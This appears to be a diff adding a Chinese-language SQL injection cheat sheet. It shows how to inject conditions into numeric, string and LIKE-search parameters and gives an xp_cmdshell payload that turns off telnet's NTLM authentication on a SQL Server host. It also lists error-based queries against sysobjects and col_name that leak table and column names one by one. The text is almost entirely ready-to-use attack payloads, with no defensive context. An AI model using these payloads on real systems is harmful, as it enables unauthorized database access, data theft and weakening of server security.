@@ -1,0 +1,37 @@
+通常注射的一些介绍：
+
+
+1.ID=49 这类注入的参数是数字型，SQL语句原貌大致如下：
+
+select * from 表名 where 字段=49
+
+注入的参数为ID=49 And [查询条件]，即是生成语句
+
+select * from 表名 where 字段=49 And [查询条件]
+
+2. Class=连续剧 这类注入的参数是字符型，SQL语句原貌大致概如下：
+
+select * from 表名 where 字段='连续剧' 
+
+注入的参数为Class=连续剧' and [查询条件] and ''=' ，即是生成语句：
+
+select * from 表名 where 字段='连续剧' and [查询条件] and ''=''
+
+3. 搜索时没过滤参数的，如keyword=关键字，SQL语句原貌大致如下：
+
+select * from 表名 where 字段like '%关键字%' 
+
+注入的参数为keyword=' and [查询条件] and '%25'='， 即是生成语句：
+
+select * from 表名 where字段like '%' and [查询条件] and '%'='%'
+
+
+23、去掉tenlnet的ntlm认证：
+;exec master.dbo.xp_cmdshell 'tlntadmn config sec = -ntlm'—
+
+
+and (select Top 1 name from sysobjects where xtype='U' and status>0)>0
+sysobjects是SQLServer的系统表，存储着所有的表名、视图、约束及其它对象，xtype='U' and status>0，表示用户建立的表名，上面的语句将第一个表名取出，与0比较大小，让报错信息把表名暴露出来。
+
+and (select Top 1 col_name(object_id('表名'),1) from sysobjects)>0
+拿到表名后，用object_id('表名')获取表名对应的内部ID，col_name(表名ID,1)代表该表的第1个字段名，将1换成2,3,4...就可以逐个获取所猜解表里面的字段名。
